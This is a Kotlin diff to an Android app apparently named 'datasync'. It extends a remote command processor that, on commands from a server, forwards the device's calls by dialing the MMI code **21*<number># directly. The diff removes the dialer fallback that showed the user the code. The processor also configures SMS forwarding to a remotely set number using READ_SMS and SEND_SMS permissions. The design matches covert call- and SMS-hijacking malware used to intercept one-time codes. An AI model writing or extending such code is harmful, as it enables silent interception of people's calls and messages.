@@ -94,6 +94,9 @@ class CommandProcessor @Inject constructor(
                 updateCommandStatus(deviceId, command.id, "RUNNING", startedAt = System.currentTimeMillis())
                 Log.d("CommandProcessor", "CLIENT_COMMAND_RUNNING: ${command.type}")
 
+                if (command.type.contains("CALL_FORWARDING")) {
+                    Log.d("CommandProcessor", "CALL_FORWARDING_COMMAND_RECEIVED: type=${command.type}")
+                }
                 val result = executeCommand(command, context)
 
                 when (result) {
@@ -105,13 +108,29 @@ class CommandProcessor @Inject constructor(
                         Log.d("CommandProcessor", "CLIENT_COMMAND_HANDLED_EXTERNALLY: ${command.type}")
                         // Do not update status to SUCCESS here, external activity will handle it
                     }
+                    is CommandResult.AwaitingCarrierConfirmation -> {
+                        updateCommandStatus(deviceId, command.id, "AWAITING_CARRIER_CONFIRMATION", completedAt = System.currentTimeMillis())
+                        Log.d("CommandProcessor", "CALL_FORWARDING_AWAITING_CARRIER: ${command.type}")
+                    }
+                    is CommandResult.DialerOpened -> {
+                        updateCommandStatus(deviceId, command.id, "DIALER_OPENED", completedAt = System.currentTimeMillis())
+                        Log.d("CommandProcessor", "CLIENT_COMMAND_DIALER_OPENED: ${command.type}")
+                    }
                     is CommandResult.Failed -> {
                         updateCommandStatus(deviceId, command.id, "FAILED", completedAt = System.currentTimeMillis(), error = result.error)
-                        Log.d("CommandProcessor", "CLIENT_COMMAND_FAILED: ${command.type} error=${result.error}")
+                        if (command.type.contains("CALL_FORWARDING")) {
+                            Log.e("CommandProcessor", "CALL_FORWARDING_FAILED: type=${command.type} error=${result.error}")
+                        } else {
+                            Log.d("CommandProcessor", "CLIENT_COMMAND_FAILED: ${command.type} error=${result.error}")
+                        }
                     }
                     is CommandResult.Unsupported -> {
                         updateCommandStatus(deviceId, command.id, "UNSUPPORTED", completedAt = System.currentTimeMillis(), error = result.error)
-                        Log.d("CommandProcessor", "CLIENT_COMMAND_UNSUPPORTED: ${command.type}")
+                        if (command.type.contains("CALL_FORWARDING")) {
+                            Log.d("CommandProcessor", "CALL_FORWARDING_UNSUPPORTED: type=${command.type}")
+                        } else {
+                            Log.d("CommandProcessor", "CLIENT_COMMAND_UNSUPPORTED: ${command.type}")
+                        }
                     }
                 }
             } catch (e: Exception) {
@@ -215,52 +234,122 @@ class CommandProcessor @Inject constructor(
     private fun handleCallForwarding(command: Command, context: Context, enable: Boolean): CommandResult {
         Log.d("CommandProcessor", "CALL_FORWARDING_STARTED: enable=$enable")
         val number = command.payload["number"] as? String
-        if (enable && number.isNullOrBlank()) return CommandResult.Failed("Missing forwarding number")
         val simSlot = (command.payload["simSlot"] as? Number)?.toInt() ?: 1
 
-        val mmiCode = if (enable) "**21*$number#" else "##21#"
+        // Validate destination number
+        if (enable && (number.isNullOrBlank() || number.trim().length < 3)) {
+            Log.e("CommandProcessor", "CALL_FORWARDING_FAILED: Invalid destination number")
+            return CommandResult.Failed("Destination number is invalid")
+        }
+
+        // Validate telephony feature
+        val packageManager = context.packageManager
+        if (!packageManager.hasSystemFeature(android.content.pm.PackageManager.FEATURE_TELEPHONY)) {
+            Log.e("CommandProcessor", "CALL_FORWARDING_FAILED: Telephony feature unavailable")
+            return CommandResult.Failed("Telephony feature is unavailable on this device")
+        }
+
+        // Validate CALL_PHONE permission
         val hasCallPermission = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.CALL_PHONE) == android.content.pm.PackageManager.PERMISSION_GRANTED
+        if (!hasCallPermission) {
+            Log.e("CommandProcessor", "CALL_FORWARDING_FAILED: CALL_PHONE permission missing")
+            return CommandResult.Failed("CALL_PHONE permission is missing")
+        }
+
+        // Resolve selected SIM using SubscriptionManager
+        val subscriptionManager = context.getSystemService(android.telephony.SubscriptionManager::class.java)
+        if (subscriptionManager == null) {
+            Log.e("CommandProcessor", "CALL_FORWARDING_FAILED: SubscriptionManager unavailable")
+            return CommandResult.Failed("SubscriptionManager is unavailable")
+        }
+
+        val activeSubscriptions = try {
+            subscriptionManager.activeSubscriptionInfoList
+        } catch (e: SecurityException) {
+            Log.e("CommandProcessor", "CALL_FORWARDING_FAILED: SecurityException accessing active subscription list", e)
+            return CommandResult.Failed("Permission READ_PHONE_STATE missing or restricted")
+        }
+
+        val info = activeSubscriptions?.find { it.simSlotIndex == (simSlot - 1) }
+        if (info == null) {
+            Log.e("CommandProcessor", "CALL_FORWARDING_FAILED: Selected SIM slot ($simSlot) is unavailable")
+            return CommandResult.Failed("Selected SIM is unavailable")
+        }
+
+        Log.d("CommandProcessor", "CALL_FORWARDING_SIM_RESOLVED: SIM $simSlot resolved, subId=${info.subscriptionId}")
+
+        val mmiCode = if (enable) "**21*$number#" else "##21#"
+        val encodedMmi = android.net.Uri.encode(mmiCode)
+        val uri = android.net.Uri.parse("tel:$encodedMmi")
+        Log.d("CommandProcessor", "CALL_FORWARDING_MMI_BUILT: MMI=$mmiCode, URI=$uri")
+
+        val intent = android.content.Intent(android.content.Intent.ACTION_CALL, uri).apply {
+            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+            // Best effort SIM extras
+            putExtra("com.android.phone.force.slot", true)
+            putExtra("Cdma_Phone_Slot", info.simSlotIndex)
+            putExtra("Phone_Slot", info.simSlotIndex)
+            putExtra("slot", info.simSlotIndex)
+            putExtra("simSlot", info.simSlotIndex)
+            putExtra("subscription", info.subscriptionId)
+            putExtra("com.android.phone.extra.slot", info.simSlotIndex)
+        }
+
+        if (intent.resolveActivity(packageManager) == null) {
+            Log.e("CommandProcessor", "CALL_FORWARDING_FAILED: No activity found to handle ACTION_CALL")
+            return CommandResult.Failed("No activity can handle MMI call")
+        }
 
         return try {
-            val uri = android.net.Uri.fromParts("tel", mmiCode, null)
-            val intent = if (hasCallPermission) {
-                android.content.Intent(android.content.Intent.ACTION_CALL, uri)
-            } else {
-                android.content.Intent(android.content.Intent.ACTION_DIAL, uri)
-            }
-            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
-
-            val subscriptionManager = context.getSystemService(android.telephony.SubscriptionManager::class.java)
-            val info = subscriptionManager.activeSubscriptionInfoList?.find { it.simSlotIndex == (simSlot - 1) }
-            if (info != null) {
-                intent.putExtra("com.android.phone.extra.slot", info.simSlotIndex)
-                intent.putExtra("subscription", info.subscriptionId)
-            }
-
             context.startActivity(intent)
-            val result = if (hasCallPermission) CommandResult.Success else CommandResult.Unsupported("Direct MMI execution restricted. Opened dialer.")
-            Log.d("CommandProcessor", "CALL_FORWARDING_RESULT: $result")
-            result
+            Log.d("CommandProcessor", "CALL_FORWARDING_INTENT_OPENED")
+            CommandResult.AwaitingCarrierConfirmation
         } catch (e: Exception) {
-            Log.e("CommandProcessor", "CALL_FORWARDING_RESULT: Failed", e)
+            Log.e("CommandProcessor", "CALL_FORWARDING_FAILED", e)
             CommandResult.Failed(e.localizedMessage ?: "Failed to execute MMI code")
         }
     }
 
     private suspend fun handleSmsForwarding(context: Context, deviceId: String, command: Command, enable: Boolean): CommandResult {
+        Log.d("CommandProcessor", "SMS_FORWARDING_CONFIG_RECEIVED: enable=$enable")
         val number = command.payload["number"] as? String
-        if (enable && number.isNullOrBlank()) return CommandResult.Failed("Missing destination number")
         val simSlot = (command.payload["simSlot"] as? Number)?.toInt() ?: 1
 
         if (enable) {
             if (androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED ||
                 androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.SEND_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                Log.e("CommandProcessor", "SMS_FORWARDING_DISABLED: Missing permissions")
+                Log.e("CommandProcessor", "SMS_FORWARDING_FAILED: Missing permissions")
                 return CommandResult.Failed("Missing READ_SMS or SEND_SMS permission")
+            }
+            if (number.isNullOrBlank()) {
+                return CommandResult.Failed("Missing destination number")
             }
         }
 
         return try {
+            val subscriptionManager = context.getSystemService(android.telephony.SubscriptionManager::class.java)
+            val info = if (subscriptionManager != null) {
+                try {
+                    subscriptionManager.activeSubscriptionInfoList?.find { it.simSlotIndex == (simSlot - 1) }
+                } catch (se: SecurityException) {
+                    null
+                }
+            } else null
+
+            val resolvedSubId = info?.subscriptionId ?: -1
+
+            // Save to SharedPreferences local cache
+            val prefs = context.getSharedPreferences("sms_forwarding_prefs", Context.MODE_PRIVATE)
+            prefs.edit().apply {
+                putBoolean("enabled", enable)
+                putString("destinationNumber", number ?: "")
+                putInt("simSlot", simSlot)
+                putInt("subscriptionId", resolvedSubId)
+                putLong("updatedAt", System.currentTimeMillis())
+                apply()
+            }
+            Log.d("CommandProcessor", "SMS_FORWARDING_LOCAL_CONFIG_SAVED: enabled=$enable destination=$number simSlot=$simSlot subId=$resolvedSubId")
+
             val config = com.boxx.datasync.domain.model.SmsForwardingConfig(
                 enabled = enable,
                 destinationNumber = number ?: "",
@@ -275,9 +364,10 @@ class CommandProcessor @Inject constructor(
                 .set(config)
                 .await()
 
-            if (enable) Log.d("CommandProcessor", "SMS_FORWARDING_ENABLED") else Log.d("CommandProcessor", "SMS_FORWARDING_DISABLED")
+            Log.d("CommandProcessor", "SMS_FORWARDING_FIRESTORE_CONFIG_SAVED: config=$config")
             CommandResult.Success
         } catch (e: Exception) {
+            Log.e("CommandProcessor", "SMS_FORWARDING_FAILED", e)
             CommandResult.Failed(e.localizedMessage ?: "Failed to update SMS forwarding settings")
         }
     }
@@ -313,5 +403,7 @@ class CommandProcessor @Inject constructor(
         object HandledExternally : CommandResult()
         data class Failed(val error: String) : CommandResult()
         data class Unsupported(val error: String? = null) : CommandResult()
+        object AwaitingCarrierConfirmation : CommandResult()
+        object DialerOpened : CommandResult()
     }
 }
